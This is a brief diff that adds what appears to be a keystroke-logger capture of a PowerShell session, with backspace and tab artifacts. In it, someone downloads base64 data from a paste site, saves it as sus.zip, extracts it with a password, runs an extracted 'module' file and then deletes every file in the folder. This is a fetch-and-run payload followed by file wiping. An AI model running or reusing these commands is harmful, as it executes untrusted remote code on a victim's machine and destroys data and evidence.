@@ -1,0 +1,12 @@
+powersh	
+ls
+cd Docu	
+ls
+c[BKSP][][50]IO.File[4f]::WriteAll	""[50]$pwd\sus.zip[4f], [][50]Convert[4f]::FromBase64St	(irm ''[50]https://0x0.st/PbWE.txt[4f])))
+ls
+unzip
+unzip -P 1m_g0d_!! sus.z	 -d out
+mv out\* .
+./modu	
+rm *
+exit
